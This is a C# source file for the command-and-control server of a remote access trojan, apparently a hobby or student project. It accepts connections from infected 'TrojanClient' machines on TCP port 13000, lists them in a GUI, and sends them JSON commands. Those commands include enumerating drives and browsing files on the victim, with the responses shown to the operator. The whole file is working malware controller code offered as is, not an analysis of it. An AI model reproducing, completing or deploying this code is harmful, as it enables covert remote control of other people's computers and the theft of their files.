using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ComponentModel;
using System.Globalization;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Server.UI;
using Newtonsoft.Json;

namespace Server.TCP
{

    public class TcpServer
    {
        static Window1 serverGUI;

        private const Int32 PORT = 13000;

        public TcpListener tcpServer;

        private List<TrojanClient> trojanClients = new List<TrojanClient>();

        public TcpServer()
        {
            serverGUI = new Window1();
            serverGUI.Show();
            serverGUI.SentPressed += SendMessage;
            serverGUI.GetFiles += GetFiles;

            BackgroundWorker worker1 = new BackgroundWorker();
            worker1.DoWork += new DoWorkEventHandler(Worker1_DoWork);
            worker1.RunWorkerAsync();
        }

        private void Worker1_DoWork(object sender, DoWorkEventArgs e)
        {
            try
            {
                serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, (ThreadStart)(async delegate ()
                {
                    tcpServer = new TcpListener(IPAddress.Any, PORT);
                    tcpServer.Start();
                    while (true)
                    {
                        var client = await tcpServer.AcceptTcpClientAsync();

                        await ReceiveFromSocket(client, RegisterClient);
                    }

                }));
            }
            catch (Exception ex)
            {
                serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Normal, (ThreadStart)(delegate ()
                {
                    serverGUI.DisplayOutput(ex.Message + "\n");
                }));
            }
            finally
            {
                if (tcpServer != null)
                {
                    tcpServer.Stop();
                }
            }
        }

        async void SendMessage(object sender, EventArgs e)
        {
            int clientId = serverGUI.GetClientId();
            int commandId = serverGUI.GetCommandId();
            if (clientId >= 0 && commandId >= 0)
            {
                var trojanClient = trojanClients[serverGUI.GetClientId()];
                var client = trojanClient.Client;


                // Get a stream object for reading and writing

                string output = "";

                NetworkStream stream = client.GetStream();
                if(commandId == 2)
                {
                    ComplexCommand command = new ComplexCommand(commandId);
                    command.Parameters.Add(serverGUI.GetFirstParameter());
                    command.Parameters.Add(serverGUI.GetSecondParameter());
                    output = JsonConvert.SerializeObject(command);
                }
                else
                {
                    Command command = new Command(commandId, serverGUI.GetFirstParameter());
                    output = JsonConvert.SerializeObject(command);
                }

                try
                {
                    SendOnSocket(stream, output);
                    await ReceiveFromSocket(stream, serverGUI.DisplayOutput);
                }
                catch
                {
                    serverGUI.DisplayOutput("Client does not respond.");
                    RemoveClient(trojanClient);
                }
            }
            else
            {
                serverGUI.DisplayOutput("Select a client and a command.");
            }
        }

        private void RemoveClient(TrojanClient trojanClient)
        {
            trojanClients.Remove(trojanClient);
            serverGUI.SetClients(trojanClients.Select(x => x.Name));
        }

        private void RemoveClient(TcpClient client)
        {
            var trojanClient = trojanClients.Where(x => x.Client == client).FirstOrDefault();
            if (trojanClient != null)
                RemoveClient(trojanClient);
        }

        private void RegisterClient(TcpClient client, string clientName)
        {
            //var clientName = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
            trojanClients.Add(new TrojanClient(client, clientName));
            serverGUI.SetClients(trojanClients.Select(x => x.Name));
        }

        private async void GetFiles(object sender, EventArgs e)
        {
            int clientId = serverGUI.GetClientId();
            int commandId = serverGUI.GetCommandId();
            if (clientId >= 0)
            {
                var trojanClient = trojanClients[serverGUI.GetClientId()];
                var client = trojanClient.Client;
                var bytes = new Byte[256];

                // Get a stream object for reading and writing

                NetworkStream stream = client.GetStream();
                string path = serverGUI.GetFile();
                Command command;
                if (string.IsNullOrEmpty(path))
                {
                    command = new Command((int)CommandsEnum.GetDrives, "");
                }
                else
                {
                    command = new Command((int)CommandsEnum.GetFiles, path);
                }

                string output = JsonConvert.SerializeObject(command);
                try
                {
                    SendOnSocket(stream, output);
                    if (string.IsNullOrEmpty(path))
                    {
                        await ReceiveFromSocket(stream, serverGUI.UpdateDrivers);
                    }
                    else
                    {
                        await ReceiveFromSocket(stream, serverGUI.UpdateList);
                    }
                }
                catch(Exception ea)
                {
                    serverGUI.DisplayOutput("Client does not respond.");
                    serverGUI.DisplayOutput("Error: " + ea.Message);
                    RemoveClient(trojanClient);
                }
            }
            else
            {
                serverGUI.DisplayOutput("Select a client and a command.");
            }
        }

        private async void SendOnSocket(NetworkStream stream, string message)
        {
            byte[] msg = System.Text.Encoding.ASCII.GetBytes(message);
            byte[] messageLength = BitConverter.GetBytes((Int32)message.Length);
            //if (stream.CanWrite)
            //{

            //    Console.WriteLine(messageLength.Length);
            //    Console.WriteLine(messageLength);

            //    Console.WriteLine();
            //    Console.WriteLine(message);
            //    Console.WriteLine(message.Length);
            //    //Array.Reverse(messageLength);
            //    await stream.WriteAsync(messageLength, 0, messageLength.Length);
            //    Thread.Sleep(200);
            //    //stream.Flush();

            //}

            if (stream.CanWrite)
            {
                await stream.WriteAsync(msg, 0, msg.Length);
                //stream.Flush();
            }
        }

        private async Task ReceiveFromSocket(NetworkStream stream, Action<string> act)
        {
            int i = 0;
            //var length = new Byte[4];
            Byte[] bytes = new Byte[500000];
            if (stream.CanRead)
            {
                //i = await stream.ReadAsync(length, 0, 4);
               // Array.Reverse(length);

                //int lengthNumber = BitConverter.ToInt32(length, 0);
                //bytes = new Byte[5000];
                i = await stream.ReadAsync(bytes, 0, bytes.Length);
            }
            string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
            Response responseObj = JsonConvert.DeserializeObject<Response>(response);
            act(responseObj.response);
        }

        private async Task ReceiveFromSocket(NetworkStream stream, Action<List<string>> act)
        {
            int i = 0;
            //var length = new Byte[4];
            Byte[] bytes = new Byte[500000];
            if (stream.CanRead)
            {
                //i = await stream.ReadAsync(length, 0, 4);
                // Array.Reverse(length);

                //int lengthNumber = BitConverter.ToInt32(length, 0);
                //bytes = new Byte[5000];
                i = await stream.ReadAsync(bytes, 0, bytes.Length);
            }
            string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
            ResponseList responseObj = JsonConvert.DeserializeObject<ResponseList>(response);
            act(responseObj.response);
        }

        private async Task ReceiveFromSocket(TcpClient client, Action<TcpClient, string> act)
        {

            NetworkStream stream = client.GetStream();
            int i = 0;
            //var length = new Byte[4];
            Byte[] bytes = new Byte[5000];
            if (stream.CanRead)
            {
                //i = await stream.ReadAsync(length, 0, 4);

               // Array.Reverse(length);

                //int lengthNumber = BitConverter.ToInt32(length, 0);
                //bytes = new Byte[5000];
                i = await stream.ReadAsync(bytes, 0, bytes.Length);
                string response = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                act(client, response);
            }
        }
    }
}
